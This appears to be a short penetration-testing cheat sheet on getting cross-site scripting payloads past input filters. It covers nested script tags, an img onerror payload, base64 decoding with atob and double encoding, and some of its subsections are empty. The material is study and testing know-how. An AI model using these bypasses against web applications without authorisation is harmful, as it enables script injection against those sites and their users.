> [!tip] Input Validation Bypass
> No filter is perfect. Try to find what parts of your payload are being filtered/removed and try to obfuscate the payload with the following techniques:
### Recursive tags Filter
```
<script>prompt(1)</script>
becomes
<scr<script>ipt>prompt(1)</scr</script>ipt>
```
### Script Tags Filter
```
If <script> tags are being filtered, try:

<img src=x onerror=prompt(1) />
```
### HTML Encoding Filter
Unfortunately not bypassable if the app encodes the input as html i.e.:
`<script>` becomes `&lt;script&gt;`
### Encoding
#### Base64
Also try to encode the JS as B64 and in the script use the following to decode the text:
```js
const newString = atob(encodedString)
```
#### URL Encoding

#### HTML Encoding

#### Double Encoding
Encoding the payload two or more times in the same encoder or different encoders might bypass filters that only decode one time.
